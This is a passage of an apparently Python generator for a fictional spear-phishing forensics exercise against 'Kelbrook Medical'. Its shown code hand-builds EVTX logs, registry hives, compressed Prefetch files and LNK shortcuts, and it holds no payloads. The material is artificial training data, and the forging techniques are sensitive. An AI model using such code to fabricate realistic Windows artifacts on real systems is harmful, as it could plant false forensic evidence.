#!/usr/bin/env python3
"""
Escenario 03 — Spear phishing contra facturación de Kelbrook Medical (ficticio).

Genera desde una misma línea temporal:
  correo/reportado_Factura_rectificativa_ARD-2026-0917.eml   correo malicioso reportado
  correo/referencia_Factura_ARD-2026-0884.eml                factura legítima para comparar
  triage/KB-FIN-WS03_triage.zip                              salida de KAPE del puesto

Los artefactos se escriben en su formato nativo de Windows: EVTX (BinXML con plantillas),
colmenas regf, Prefetch con compresión MAM (LZXPRESS Huffman), LNK (MS-SHLLINK) e
historial de Edge (SQLite).

Todo es sintético: dominios inventados, IPs de los rangos de documentación (RFC 5737 y
2001:db8::/32), personas y datos ficticios. No contiene ningún binario funcional: el
implante solo existe a través de sus rastros. Uso:  python3 generar_escenario.py
"""
import base64
import hashlib
import io
import os
import random
import sqlite3
import struct
import tempfile
import uuid
import zipfile
import zlib
from datetime import datetime, timedelta, timezone

random.seed(20261013)
BASE = os.path.dirname(os.path.abspath(__file__))

# ======================================================================= tiempo
# Internamente todo va en ticks FILETIME (100 ns desde 1601-01-01 UTC).
EPOCH1601 = datetime(1601, 1, 1, tzinfo=timezone.utc)
TICKS = 10_000_000

def FT(y, mo, d, h=0, mi=0, s=0.0):
    """Hora UTC -> FILETIME. Los segundos pueden llevar fracción."""
    base = datetime(y, mo, d, h, mi, 0, tzinfo=timezone.utc)
    return int((base - EPOCH1601).total_seconds()) * TICKS + int(round(s * TICKS))

def T(d, h, mi, s=0.0, mo=10):
    """Atajo para octubre de 2026 (UTC)."""
    return FT(2026, mo, d, h, mi, s)

def ft2dt(ft):
    return EPOCH1601 + timedelta(microseconds=ft // 10)

def ft2unix(ft):
    return (ft - FT(1970, 1, 1)) / TICKS

def sec(x):
    return int(x * TICKS)

def iso(ft, digits=7):
    """2026-10-13 07:31:19.1234567 (formato de Sysmon UtcTime con 3 decimales si digits=3)."""
    d = ft2dt(ft)
    frac = f"{ft % TICKS:07d}"[:digits]
    return d.strftime("%Y-%m-%d %H:%M:%S") + "." + frac


# ======================================================================= EVTX
# Formato documentado por libevtx (J. Metz) y python-evtx (W. Ballenthin).
# Fichero = cabecera de 4096 bytes + chunks de 64 KiB. Cada chunk lleva su tabla de
# cadenas y de plantillas; cada registro es un fragmento BinXML con una instancia de
# plantilla (definida en línea la primera vez que aparece en el chunk) y sus valores.

class EvtType:
    NULL, STR, U8, U16, U32, U64, BOOL, BIN, GUID, FT, SID, HEX32, HEX64 = (
        0x00, 0x01, 0x04, 0x06, 0x08, 0x0A, 0x0D, 0x0E, 0x0F, 0x11, 0x13, 0x14, 0x15)

def sid_bytes(sid):
    parts = sid.split("-")
    rev, auth, subs = int(parts[1]), int(parts[2]), [int(x) for x in parts[3:]]
    return struct.pack("<BB", rev, len(subs)) + auth.to_bytes(6, "big") + b"".join(struct.pack("<I", s) for s in subs)

def guid_bytes(g):
    return uuid.UUID(g.strip("{}")).bytes_le

def enc_value(typ, v):
    if typ == EvtType.STR:
        return v.encode("utf-16-le")
    if typ == EvtType.U8:
        return struct.pack("<B", v)
    if typ == EvtType.U16:
        return struct.pack("<H", v)
    if typ in (EvtType.U32, EvtType.HEX32):
        return struct.pack("<I", v)
    if typ in (EvtType.U64, EvtType.HEX64, EvtType.FT):
        return struct.pack("<Q", v)
    if typ == EvtType.BOOL:
        return struct.pack("<I", 1 if v else 0)
    if typ == EvtType.GUID:
        return guid_bytes(v)
    if typ == EvtType.SID:
        return sid_bytes(v)
    if typ == EvtType.BIN:
        return bytes(v)
    if typ == EvtType.NULL:
        return b""
    raise ValueError(typ)

def name_hash(s):
    h = 0
    for c in s:
        h = (h * 65599 + ord(c)) & 0xFFFFFFFF
    return h & 0xFFFF

EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"

class Event:
    """Un evento listo para serializar. data = [(nombre o None, tipo, valor), ...]"""
    __slots__ = ("ft", "provider", "guid", "esn", "eid", "qual", "ver", "level", "task", "opcode",
                 "kw", "pid", "tid", "channel", "user", "activity", "data", "rid")

    def __init__(self, ft, provider, eid, data, *, guid=None, esn=None, qual=None, ver=0, level=4,
                 task=0, opcode=0, kw=0x8000000000000000, pid=4, tid=0, channel="", user=None,
                 activity=None):
        self.ft, self.provider, self.eid, self.data = ft, provider, eid, data
        self.guid, self.esn, self.qual, self.ver, self.level = guid, esn, qual, ver, level
        self.task, self.opcode, self.kw, self.pid, self.tid = task, opcode, kw, pid, tid
        self.channel, self.user, self.activity, self.rid = channel, user, activity, 0

    def template_key(self, computer):
        return (self.provider, self.guid, self.esn, self.qual is not None, self.activity is not None,
                self.user is not None, self.channel, computer,
                tuple((n, t) for n, t, _ in self.data))

    def values(self):
        """Valores de sustitución en el orden de la plantilla (ver _template_tree)."""
        vals = [(EvtType.U16, self.eid), (EvtType.U8, self.ver), (EvtType.U8, self.level),
                (EvtType.U16, self.task), (EvtType.U8, self.opcode), (EvtType.HEX64, self.kw),
                (EvtType.FT, self.ft), (EvtType.U64, self.rid), (EvtType.U32, self.pid),
                (EvtType.U32, self.tid)]
        if self.qual is not None:
            vals.append((EvtType.U16, self.qual))
        if self.activity is not None:
            vals.append((EvtType.GUID, self.activity))
        if self.user is not None:
            vals.append((EvtType.SID, self.user))
        for _, t, v in self.data:
            vals.append((t, v))
        return vals


def _template_tree(key):
    """Árbol de la plantilla: ('E', nombre, [atributos], [hijos]); valores ('T', texto) o ('S', i, tipo)."""
    provider, guid, esn, has_q, has_act, has_user, channel, computer, fields = key
    S = lambda i, t: ("S", i, t)
    i = 10
    prov_attrs = [("Name", ("T", provider))]
    if guid:
        prov_attrs.append(("Guid", ("T", guid)))
    if esn:
        prov_attrs.append(("EventSourceName", ("T", esn)))
    eid_attrs = []
    if has_q:
        eid_attrs = [("Qualifiers", S(i, EvtType.U16))]
        i += 1
    corr_attrs = []
    if has_act:
        corr_attrs = [("ActivityID", S(i, EvtType.GUID))]
        i += 1
    sec_attrs = []
    if has_user:
        sec_attrs = [("UserID", S(i, EvtType.SID))]
        i += 1
    system = ("E", "System", [], [
        ("E", "Provider", prov_attrs, []),
        ("E", "EventID", eid_attrs, [S(0, EvtType.U16)]),
        ("E", "Version", [], [S(1, EvtType.U8)]),
        ("E", "Level", [], [S(2, EvtType.U8)]),
        ("E", "Task", [], [S(3, EvtType.U16)]),
        ("E", "Opcode", [], [S(4, EvtType.U8)]),
        ("E", "Keywords", [], [S(5, EvtType.HEX64)]),
        ("E", "TimeCreated", [("SystemTime", S(6, EvtType.FT))], []),
        ("E", "EventRecordID", [], [S(7, EvtType.U64)]),
        ("E", "Correlation", corr_attrs, []),
        ("E", "Execution", [("ProcessID", S(8, EvtType.U32)), ("ThreadID", S(9, EvtType.U32))], []),
        ("E", "Channel", [], [("T", channel)]),
        ("E", "Computer", [], [("T", computer)]),
        ("E", "Security", sec_attrs, []),
    ])
    datas = []
    for n, t in fields:
        attrs = [("Name", ("T", n))] if n is not None else []
        datas.append(("E", "Data", attrs, [S(i, t)]))
        i += 1
    return ("E", "Event", [("xmlns", ("T", EVENT_NS))], [system, ("E", "EventData", [], datas)])


class _Chunk:
    SIZE = 0x10000

    def __init__(self, computer):
        self.buf = bytearray(512)
        self.names = {}          # nombre -> offset en el chunk
        self.str_table = [0] * 64
        self.templates = {}      # clave -> (offset de la definición, id)
        self.tpl_table = [0] * 32
        self.first = self.last = None
        self.last_off = 0
        self.computer = computer

    # --- primitivas BinXML con conocimiento de la posición dentro del chunk
    def _name(self, out, s):
        if s in self.names:
            out += struct.pack("<I", self.names[s])
            return
        here = len(self.buf) + len(out) + 4
        h = name_hash(s)
        out += struct.pack("<I", here)
        out += struct.pack("<IHH", self.str_table[h % 64], h, len(s)) + s.encode("utf-16-le") + b"\0\0"
        self.names[s] = here
        self.str_table[h % 64] = here

    def _value(self, out, v):
        if v[0] == "T":
            txt = v[1]
            out += struct.pack("<BBH", 0x05, 0x01, len(txt)) + txt.encode("utf-16-le")
        else:
            out += struct.pack("<BHB", 0x0D, v[1], v[2])

    def _element(self, out, node):
        _, name, attrs, children = node
        start = len(out)
        out += struct.pack("<BHI", 0x41 if attrs else 0x01, 0xFFFF, 0)
        self._name(out, name)
        if attrs:
            alen_pos = len(out)
            out += b"\0\0\0\0"
            for k, (an, av) in enumerate(attrs):
                out.append(0x46 if k < len(attrs) - 1 else 0x06)
                self._name(out, an)
                self._value(out, av)
            struct.pack_into("<I", out, alen_pos, len(out) - alen_pos - 4)
        if children:
            out.append(0x02)
            for ch in children:
                if ch[0] == "E":
                    self._element(out, ch)
                else:
                    self._value(out, ch)
            out.append(0x04)
        else:
            out.append(0x03)
        struct.pack_into("<I", out, start + 3, len(out) - start - 7)

    def record_bytes(self, ev):
        key = ev.template_key(self.computer)
        out = bytearray()
        rec_off = len(self.buf)
        out += struct.pack("<IIQQ", 0x00002A2A, 0, ev.rid, ev.ft)
        out += b"\x0f\x01\x01\x00"
        new_tpl = key not in self.templates
        if new_tpl:
            g = uuid.UUID(bytes=hashlib.md5(repr(key).encode()).digest())
            gb = g.bytes_le
            tid = struct.unpack("<I", gb[:4])[0]
            def_off = rec_off + len(out) + 10
            out += struct.pack("<BBII", 0x0C, 0x01, tid, def_off)
            # La definición empieza con 24 bytes de cabecera; el cuerpo se escribe después.
            saved = len(out)
            out += b"\0" * 24
            # Para que _name calcule bien los offsets, el cuerpo se construye "dentro" de out.
            body_start = len(out)
            out += b"\x0f\x01\x01\x00"
            self._element(out, _template_tree(key))
            out.append(0x00)
            data_len = len(out) - body_start
            struct.pack_into("<I16sI", out, saved, self.tpl_table[tid % 32], gb, data_len)
            self.tpl_table[tid % 32] = def_off
            self.templates[key] = (def_off, tid)
        else:
            def_off, tid = self.templates[key]
            out += struct.pack("<BBII", 0x0C, 0x01, tid, def_off)
        vals = ev.values()
        enc = [enc_value(t, v) for t, v in vals]
        out += struct.pack("<I", len(vals))
        for (t, _), e in zip(vals, enc):
            out += struct.pack("<HBB", len(e), t, 0)
        for e in enc:
            out += e
        out += b"\x00"                                  # fin del fragmento
        out += b"\0" * (-(len(out) + 4) % 8)              # registros alineados a 8 bytes
        out += b"\0\0\0\0"
        struct.pack_into("<I", out, 4, len(out))
        struct.pack_into("<I", out, len(out) - 4, len(out))
        return out, new_tpl

    def try_add(self, ev):
        snap = (dict(self.names), list(self.str_table), dict(self.templates), list(self.tpl_table))
        rec, _ = self.record_bytes(ev)
        if len(self.buf) + len(rec) > self.SIZE:
            self.names, self.str_table, self.templates, self.tpl_table = snap
            return False
        self.last_off = len(self.buf)
        self.buf += rec
        if self.first is None:
            self.first = ev.rid
        self.last = ev.rid
        return True

    def finish(self):
        free = len(self.buf)
        data = bytes(self.buf) + b"\0" * (self.SIZE - free)
        hdr = bytearray(data[:512])
        struct.pack_into("<8sQQQQIIII", hdr, 0, b"ElfChnk\0", self.first, self.last, self.first,
                         self.last, 128, self.last_off, free, zlib.crc32(data[512:free]))
        struct.pack_into("<64I", hdr, 128, *self.str_table)
        struct.pack_into("<32I", hdr, 384, *self.tpl_table)
        struct.pack_into("<I", hdr, 124, zlib.crc32(bytes(hdr[:120]) + bytes(hdr[128:512])))
        return bytes(hdr) + data[512:]


def write_evtx(events, computer, first_rid, max_chunks=None):
    """Serializa los eventos (ya ordenados). Si max_chunks, conserva solo los últimos
    (log circular que ya ha dado la vuelta). Devuelve (bytes, primer_rid, último_rid)."""
    chunks = []
    cur = _Chunk(computer)
    rid = first_rid
    for ev in events:
        ev.rid = rid
        if not cur.try_add(ev):
            chunks.append(cur)
            cur = _Chunk(computer)
            if not cur.try_add(ev):
                raise ValueError("evento demasiado grande para un chunk")
        rid += 1
    if cur.first is not None:
        chunks.append(cur)
    if max_chunks and len(chunks) > max_chunks:
        chunks = chunks[-max_chunks:]
    blobs = [c.finish() for c in chunks]
    hdr = bytearray(4096)
    struct.pack_into("<8sQQQIHHHH", hdr, 0, b"ElfFile\0", 0, len(blobs) - 1, rid, 128, 2, 3, 4096,
                     len(blobs))
    struct.pack_into("<I", hdr, 120, 0x0001)                    # sucio: copiado con el servicio vivo
    struct.pack_into("<I", hdr, 124, zlib.crc32(bytes(hdr[:120])))
    return bytes(hdr) + b"".join(blobs), chunks[0].first, chunks[-1].last


# ======================================================================= REGISTRO (regf)
# Formato documentado por libregf (J. Metz): base block de 4096 bytes y hbins de 4 KiB
# con celdas nk (clave), vk (valor), lh (lista de subclaves), sk (seguridad), db (datos grandes).

REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD = 1, 2, 3, 4, 7, 11

def reg_data(typ, v):
    if isinstance(v, (bytes, bytearray)):
        return bytes(v)
    if typ in (REG_SZ, REG_EXPAND_SZ):
        return v.encode("utf-16-le") + b"\0\0"
    if typ == REG_MULTI_SZ:
        return b"".join(s.encode("utf-16-le") + b"\0\0" for s in v) + b"\0\0"
    if typ == REG_DWORD:
        return struct.pack("<I", v)
    if typ == REG_QWORD:
        return struct.pack("<Q", v)
    raise ValueError(typ)


class RegKey:
    def __init__(self, name, ts):
        self.name, self.ts = name, ts
        self.sub = {}
        self.values = []

    def key(self, path, ts=None):
        """Crea (o devuelve) la subclave indicada por 'A\\B\\C'. ts fija el LastWrite de la última."""
        k = self
        for part in [p for p in path.split("\\") if p]:
            low = part.lower()
            if low not in k.sub:
                k.sub[low] = RegKey(part, ts if ts is not None else k.ts)
            k = k.sub[low]
        if ts is not None:
            k.ts = ts
        return k

    def set(self, name, typ, value, ts=None):
        data = reg_data(typ, value)
        self.values = [v for v in self.values if v[0].lower() != name.lower()]
        self.values.append((name, typ, data))
        if ts is not None:
            self.ts = max(self.ts, ts)
        return self


def reg_sd(owner, group, aces):
    """Descriptor de seguridad auto-relativo con DACL de ACEs ACCESS_ALLOWED (sid, máscara, flags)."""
    acl = b""
    for sid, mask, flags in aces:
        sb = sid_bytes(sid)
        acl += struct.pack("<BBHI", 0, flags, 8 + len(sb), mask) + sb
    acl = struct.pack("<BBHHH", 2, 0, 8 + len(acl), len(aces), 0) + acl
    o, g = sid_bytes(owner), sid_bytes(group)
    off_dacl = 20
    off_o = off_dacl + len(acl)
    off_g = off_o + len(o)
    return struct.pack("<BBHIIII", 1, 0, 0x8004, off_o, off_g, 0, off_dacl) + acl + o + g


def lh_hash(name):
    h = 0
    for c in name.upper():
        h = (h * 37 + ord(c)) & 0xFFFFFFFF
    return h


def write_hive(root, file_name, sd, seq=1):
    """Serializa un árbol RegKey en una colmena regf limpia (secuencias iguales)."""
    cells = []                       # [contenido, offset]; el contenido se rellena al final

    def cell(n_bytes):
        c = [n_bytes, None, None]    # tamaño del contenido, offset, bytes finales
        cells.append(c)
        return c

    plan = []                        # (clave, celdas asociadas)

    def walk(k, parent):
        nm = k.name.encode("latin-1") if all(ord(ch) < 128 for ch in k.name) else k.name.encode("utf-16-le")
        nk = cell(0x4C + len(nm))
        entry = {"k": k, "nk": nk, "parent": parent, "nm": nm, "vlist": None, "vks": [], "lh": None, "kids": []}
        plan.append(entry)
        if k.values:
            entry["vlist"] = cell(4 * len(k.values))
            for name, typ, data in k.values:
                vn = name.encode("latin-1") if all(ord(ch) < 128 for ch in name) else name.encode("utf-16-le")
                vk = cell(0x14 + len(vn))
                dcell, segs = None, []
                if len(data) > 4:
                    if len(data) <= 16344:
                        dcell = cell(len(data))
                    else:
                        parts = [data[i:i + 16344] for i in range(0, len(data), 16344)]
                        dcell = cell(8)                      # db
                        seglist = cell(4 * len(parts))
                        segs = [seglist] + [cell(len(p)) for p in parts]
                entry["vks"].append((name, typ, data, vn, vk, dcell, segs))
        kids = sorted(k.sub.values(), key=lambda x: x.name.upper())
        if kids:
            entry["lh"] = cell(4 + 8 * len(kids))
        for ch in kids:
            entry["kids"].append(walk(ch, entry))
        return entry

    walk(root, None)
    sk = cell(0x14 + len(sd))        # la raíz tiene que ser la primera celda (offset 0x20)

    # --- disposición en hbins
    hbins, pos, hb_start, hb_size = [], 0, 0, 0
    def new_hbin(min_size):
        nonlocal hb_start, hb_size, pos
        hb_start = pos if not hbins else hbins[-1][0] + hbins[-1][1]
        hb_size = max(4096, -(-(min_size + 32) // 4096) * 4096)
        hbins.append([hb_start, hb_size])
        pos = hb_start + 32
    new_hbin(0)
    for c in cells:
        size = -(-(4 + c[0]) // 8) * 8
        if pos + size > hb_start + hb_size:
            new_hbin(size)
        c[1] = pos
        c.append(size)
        pos += size
    total = hbins[-1][0] + hbins[-1][1]
    blob = bytearray(total)
    for start, size in hbins:
        struct.pack_into("<4sIIQQI", blob, start, b"hbin", start, size, 0, root.ts if start == 0 else 0, 0)

    def put(c, data):
        assert len(data) == c[0], (len(data), c[0])
        struct.pack_into("<i", blob, c[1], -c[3])
        blob[c[1] + 4:c[1] + 4 + len(data)] = data

    put(sk, struct.pack("<2sHIIII", b"sk", 0, sk[1], sk[1], len(plan), len(sd)) + sd)
    for e in plan:
        k = e["k"]
        max_sub = max([len(x["nm"]) * (2 if x["nm"] == x["k"].name.encode("latin-1", "ignore") else 1)
                       for x in e["kids"]] or [0])
        max_vn = max([len(v[0]) * 2 for v in e["vks"]] or [0])
        max_vd = max([len(v[2]) for v in e["vks"]] or [0])
        is_ascii = len(e["nm"]) == len(k.name)
        flags = 0x20 if is_ascii else 0
        if e["parent"] is None:
            flags |= 0x0C
        nk = struct.pack("<2sHQIIIIIIIIIIIIIIIHH", b"nk", flags, k.ts, 0,
                         e["parent"]["nk"][1] if e["parent"] else 0, len(e["kids"]), 0,
                         e["lh"][1] if e["lh"] else 0xFFFFFFFF, 0xFFFFFFFF, len(e["vks"]),
                         e["vlist"][1] if e["vlist"] else 0xFFFFFFFF, sk[1], 0xFFFFFFFF,
                         max_sub, 0, max_vn, max_vd, 0, len(e["nm"]), 0) + e["nm"]
        put(e["nk"], nk)
        if e["vlist"]:
            put(e["vlist"], b"".join(struct.pack("<I", v[4][1]) for v in e["vks"]))
        for name, typ, data, vn, vk, dcell, segs in e["vks"]:
            vflags = 1 if len(vn) == len(name) else 0
            if dcell is None:
                dsize, doff = len(data) | 0x80000000, struct.unpack("<I", data.ljust(4, b"\0"))[0]
            else:
                dsize, doff = len(data), dcell[1]
            put(vk, struct.pack("<2sHIIIHH", b"vk", len(vn), dsize, doff, typ, vflags, 0) + vn)
            if dcell is not None and not segs:
                put(dcell, data)
            elif segs:
                seglist, parts = segs[0], segs[1:]
                put(dcell, struct.pack("<2sHI", b"db", len(parts), seglist[1]))
                put(seglist, b"".join(struct.pack("<I", p[1]) for p in parts))
                for i, p in enumerate(parts):
                    put(p, data[i * 16344:(i + 1) * 16344])
        if e["lh"]:
            put(e["lh"], struct.pack("<2sH", b"lh", len(e["kids"])) + b"".join(
                struct.pack("<II", x["nk"][1], lh_hash(x["k"].name)) for x in e["kids"]))
    # Celdas libres al final de cada hbin
    for start, size in hbins:
        p = start + 32
        while p < start + size:
            n = struct.unpack_from("<i", blob, p)[0]
            if n == 0:
                struct.pack_into("<i", blob, p, start + size - p)
                break
            p += abs(n)

    base = bytearray(4096)
    fn = file_name[-31:].encode("utf-16-le")
    struct.pack_into("<4sIIQIIIIIII", base, 0, b"regf", seq, seq, root.ts, 1, 5, 0, 1, plan[0]["nk"][1], total, 1)
    base[48:48 + len(fn)] = fn
    chk = 0
    for i in range(0, 508, 4):
        chk ^= struct.unpack_from("<I", base, i)[0]
    chk = 0xFFFFFFFE if chk == 0xFFFFFFFF else (1 if chk == 0 else chk)
    struct.pack_into("<I", base, 508, chk)
    return bytes(base) + bytes(blob)


# ======================================================================= PREFETCH (SCCA v30 + MAM)
# Windows 10/11 guardan el Prefetch comprimido: cabecera "MAM\x04" + tamaño original +
# flujo LZXPRESS Huffman ([MS-XCA] 2.1). El contenido es SCCA versión 30, variante con la
# matriz de métricas en 0x128 (la de Windows 10 1903 en adelante y Windows 11).

def _huff_lengths(freq, maxlen=15):
    import heapq
    f = list(freq)
    while True:
        heap = [(c, i, (i,)) for i, c in enumerate(f) if c]
        lengths = [0] * len(f)
        if len(heap) == 1:
            lengths[heap[0][1]] = 1
            return lengths
        heapq.heapify(heap)
        tie = len(f)
        while len(heap) > 1:
            c1, _, s1 = heapq.heappop(heap)
            c2, _, s2 = heapq.heappop(heap)
            for s in s1 + s2:
                lengths[s] += 1
            heapq.heappush(heap, (c1 + c2, tie, s1 + s2))
            tie += 1
        if max(lengths) <= maxlen:
            return lengths
        f = [max(1, c >> 1) if c else 0 for c in f]


def _canonical(lengths):
    codes, code = [0] * len(lengths), 0
    for ln in range(1, 16):
        for s in range(len(lengths)):
            if lengths[s] == ln:
                codes[s] = code
                code += 1
        code <<= 1
    return codes


def lzxpress_huffman(data):
    out = bytearray()
    n = len(data)
    head = {}
    for blk in range(0, max(n, 1), 65536):
        end = min(blk + 65536, n)
        last = end >= n
        toks, i = [], blk
        while i < end:
            best_len, best_d = 0, 0
            if i + 3 <= end:
                key = data[i:i + 3]
                for j in reversed(head.get(key, [])[-24:]):
                    d = i - j
                    if d > 65535:
                        break
                    ln = 0
                    lim = min(end - i, 4096)
                    while ln < lim and data[j + ln] == data[i + ln]:
                        ln += 1
                    if ln > best_len:
                        best_len, best_d = ln, d
            step = best_len if best_len >= 3 else 1
            for k in range(i, min(i + step, n - 2)):
                head.setdefault(data[k:k + 3], []).append(k)
            if best_len >= 3:
                toks.append((best_len, best_d))
                i += best_len
            else:
                toks.append(data[i])
                i += 1
        freq = [0] * 512
        for t in toks:
            if isinstance(t, int):
                freq[t] += 1
            else:
                ln, d = t
                freq[256 + ((d.bit_length() - 1) << 4) + min(ln - 3, 15)] += 1
        if last:
            freq[256] += 1                                   # símbolo de fin de flujo
        lengths = _huff_lengths(freq)
        codes = _canonical(lengths)
        out += bytes((lengths[2 * k] & 0xF) | ((lengths[2 * k + 1] & 0xF) << 4) for k in range(256))
        slot1, slot2 = len(out), len(out) + 2
        out += b"\0\0\0\0"
        acc, free = 0, 16

        def bits(nb, val):
            nonlocal acc, free, slot1, slot2
            if nb == 0:
                return
            if nb <= free:
                acc = (acc << nb) | val
                free -= nb
                return
            rest = nb - free
            acc = (acc << free) | (val >> rest)
            struct.pack_into("<H", out, slot1, acc & 0xFFFF)
            slot1, slot2 = slot2, len(out)
            out.extend(b"\0\0")
            acc, free = val & ((1 << rest) - 1), 16 - rest

        for t in toks:
            if isinstance(t, int):
                bits(lengths[t], codes[t])
                continue
            ln, d = t
            ob = d.bit_length() - 1
            lb = ln - 3
            sym = 256 + (ob << 4) + min(lb, 15)
            bits(lengths[sym], codes[sym])
            if lb >= 15:
                if lb - 15 < 255:
                    out.append(lb - 15)
                else:
                    out.append(255)
                    out += struct.pack("<H", lb)
            bits(ob, d - (1 << ob))
        if last:
            bits(lengths[256], codes[256])
        struct.pack_into("<H", out, slot1, (acc << free) & 0xFFFF)
        struct.pack_into("<H", out, slot2, 0)
    return bytes(out)


def mam_compress(data):
    return b"MAM\x04" + struct.pack("<I", len(data)) + lzxpress_huffman(data)


def prefetch_hash(device_path):
    h = 314159
    for b in device_path.upper().encode("utf-16-le"):
        h = (h * 37 + b) & 0xFFFFFFFF
    return h


def build_prefetch(exe, device_path, run_times, run_count, files, volumes, rng):
    """exe: nombre en mayúsculas; device_path: ruta \\DEVICE\\HARDDISKVOLUMEn\\... (para el hash);
    run_times: FILETIME, el más reciente primero (máx. 8); files: rutas \\VOLUME{...}\\...;
    volumes: [{'path','created','serial','dirs'}]. Devuelve (nombre .pf, bytes comprimidos)."""
    names = bytearray()
    offs = []
    for f in files:
        offs.append(len(names))
        names += f.encode("utf-16-le") + b"\0\0"
    metrics = bytearray()
    start = 0
    for i, f in enumerate(files):
        dur = rng.randint(1, 900)
        flags = 0x200 if f.upper().endswith((".DLL", ".EXE", ".MUI", ".NLS")) else 0x2
        ref = rng.randint(2000, 400000) | (rng.randint(1, 12) << 48)
        metrics += struct.pack("<IIIIIIQ", start, dur, dur, offs[i], len(f), flags, ref)
        start += rng.randint(0, 40)
    traces = bytearray()
    n_traces = 0
    for _ in files:
        for _ in range(rng.randint(1, 6)):
            traces += struct.pack("<IBBH", rng.randint(1, 60), 3, rng.randint(1, 4), 0xFFFF)
            n_traces += 1
    # Volúmenes: estructuras de 96 bytes y después sus datos
    vol_hdrs = bytearray()
    vol_data = bytearray()
    base = 96 * len(volumes)
    for v in volumes:
        dp_off = base + len(vol_data)
        vol_data += v["path"].encode("utf-16-le") + b"\0\0"
        vol_data += b"\0" * (-len(vol_data) % 8)
        refs = [rng.randint(2000, 400000) | (rng.randint(1, 12) << 48) for _ in v["dirs"]]
        fr_off = base + len(vol_data)
        vol_data += struct.pack("<IIQ", 3, len(refs), 0) + b"".join(struct.pack("<Q", r) for r in refs)
        fr_size = 16 + 8 * len(refs)
        ds_off = base + len(vol_data)
        for d in v["dirs"]:
            vol_data += struct.pack("<H", len(d)) + d.encode("utf-16-le") + b"\0\0"
        vol_data += b"\0" * (-len(vol_data) % 8)
        vol_hdrs += struct.pack("<IIQIIIIII", dp_off, len(v["path"]), v["created"], v["serial"], fr_off,
                                fr_size, ds_off, len(v["dirs"]), 0) + b"\0" * 24 + struct.pack("<I", 0) \
            + b"\0" * 24 + struct.pack("<I", 0)
    vols = vol_hdrs + vol_data
    m_off = 84 + 212
    t_off = m_off + len(metrics)
    n_off = t_off + len(traces)
    v_off = n_off + len(names)
    total = v_off + len(vols)
    rt = (list(run_times[:8]) + [0] * 8)[:8]
    info = struct.pack("<IIIIIIIII", m_off, len(files), t_off, n_traces, n_off, len(names), v_off,
                       len(volumes), len(vols)) + b"\0" * 8 + struct.pack("<8Q", *rt) + b"\0" * 8 + \
        struct.pack("<IIIII", run_count, 0, 3 if run_count else 0, 0, 0) + b"\0" * 76
    assert len(info) == 212
    h = prefetch_hash(device_path)
    hdr = struct.pack("<I4sII", 30, b"SCCA", 0x11, total) + exe[:29].encode("utf-16-le").ljust(60, b"\0") + \
        struct.pack("<II", h, 0)
    raw = hdr + info + metrics + traces + names + vols
    assert len(raw) == total
    return f"{exe}-{h:08X}.pf", mam_compress(raw)


# ======================================================================= LNK (MS-SHLLINK)

CLSID_MYCOMPUTER = "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
LNK_CLSID = "{00021401-0000-0000-C000-000000000046}"

def fat_dt(ft):
    d = ft2dt(ft)
    return struct.pack("<HH", ((d.year - 1980) << 9) | (d.month << 5) | d.day,
                       (d.hour << 11) | (d.minute << 5) | (d.second // 2))

def _file_item(name, is_dir, size, mtime, ctime, atime, mft):
    short = name.upper() if len(name) <= 12 and name.count(".") <= 1 and " " not in name else \
        (name.split(".")[0].replace(" ", "")[:6].upper() + "~1" + ("." + name.rsplit(".", 1)[1][:3].upper() if "." in name else ""))
    sn = short.encode("ascii", "replace") + b"\0"
    if len(sn) % 2:
        sn += b"\0"
    head = struct.pack("<BBI", 0x31 if is_dir else 0x32, 0, 0 if is_dir else size) + fat_dt(mtime) + \
        struct.pack("<H", 0x10 if is_dir else 0x20) + sn
    ln = name.encode("utf-16-le") + b"\0\0"
    ext_off = 2 + len(head)
    ext = struct.pack("<HI", 9, 0xBEEF0004) + fat_dt(ctime) + fat_dt(atime) + struct.pack("<HHQQHII", 0x2E, 0, mft, 0, 0, 0, 0) + ln
    ext = struct.pack("<H", len(ext) + 4) + ext + struct.pack("<H", ext_off)
    item = head + ext
    return struct.pack("<H", len(item) + 2) + item

def lnk_idlist(path, entries):
    """path 'C:\\a\\b\\c.ext'; entries: lista de (size, mtime, ctime, atime, mft, is_dir) por componente."""
    items = struct.pack("<HBB", 0x14, 0x1F, 0x50) + guid_bytes(CLSID_MYCOMPUTER)
    drive = path[:3]
    vol = b"\x2F" + drive.encode("ascii").ljust(23, b"\0")
    items += struct.pack("<H", len(vol) + 2) + vol
    offsets = []
    for comp, e in zip(path[3:].split("\\"), entries):
        offsets.append(len(items))
        items += _file_item(comp, e[5], *e[:5])
    items += b"\0\0"
    return struct.pack("<H", len(items)) + items, offsets

def _lnk_str(s):
    return struct.pack("<H", len(s)) + s.encode("utf-16-le")

def droid_guid(ts_ft, seq, mac):
    """GUID versión 1 (como los ObjectID de NTFS) con la MAC como nodo."""
    t = ts_ft + 5748192000000000                       # época UUID (1582-10-15) frente a FILETIME (1601)
    node = int(mac.replace(":", ""), 16)
    return uuid.UUID(fields=(t & 0xFFFFFFFF, (t >> 32) & 0xFFFF, ((t >> 48) & 0x0FFF) | 0x1000,
                             0x80 | ((seq >> 8) & 0x3F), seq & 0xFF, node))

def build_lnk(*, target, entries, target_times, target_size, flags_extra=0, name=None, rel=None,
              workdir=None, args=None, icon=None, icon_env=None, icon_index=0, show=1, attrs=0x20,
              volume=None, network=None, machine, vol_droid, obj_droid, known_folder=None):
    """target_times = (creación, acceso, escritura) del destino. volume = (tipo, serie, etiqueta)
    para destinos locales; network = (\\\\servidor\\recurso, letra) para unidades de red."""
    flags = 0x1 | 0x2 | 0x80 | flags_extra
    idl, offs = lnk_idlist(target, entries)
    body = idl
    # LinkInfo
    if network is None:
        dtype, serial, label = volume
        vid = struct.pack("<IIII", 16 + len(label) + 1, dtype, serial, 16) + label.encode() + b"\0"
        lbp = target.encode("cp1252") + b"\0"
        hdr_size = 0x1C
        vid_off = hdr_size
        lbp_off = vid_off + len(vid)
        suf_off = lbp_off + len(lbp)
        li = struct.pack("<IIIIIII", 0, hdr_size, 1, vid_off, lbp_off, 0, suf_off) + vid + lbp + b"\0"
    else:
        share, letter = network
        netname = share.encode("cp1252") + b"\0"
        dev = letter.encode() + b"\0"
        cnrl = struct.pack("<IIIIII", 0, 3, 0x14, 0x14 + len(netname), 0x00020000, 0) + netname + dev
        cnrl = struct.pack("<I", len(cnrl)) + cnrl[4:]
        suffix = target[3:].encode("cp1252") + b"\0"
